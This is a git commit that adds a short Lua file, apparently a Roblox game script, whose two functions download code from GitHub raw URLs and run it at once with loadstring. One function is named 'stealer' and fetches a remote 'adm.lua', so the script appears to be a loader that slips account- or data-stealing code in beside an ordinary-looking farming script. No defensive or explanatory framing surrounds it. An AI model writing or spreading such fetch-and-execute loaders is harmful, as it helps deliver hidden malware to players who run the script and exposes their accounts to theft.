f2003baad77e6476c0809d853488f27c42c6cd54
Rizo2tuff <ftyifyioftufgt@gmail.com>
2025-04-27 16:24:35 +0200

    Create notsocrazy.lua

---
+++ notsocrazy.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/asiudgh/refs/heads/main/adm.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/loading-screen/refs/heads/main/loadingscreen.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
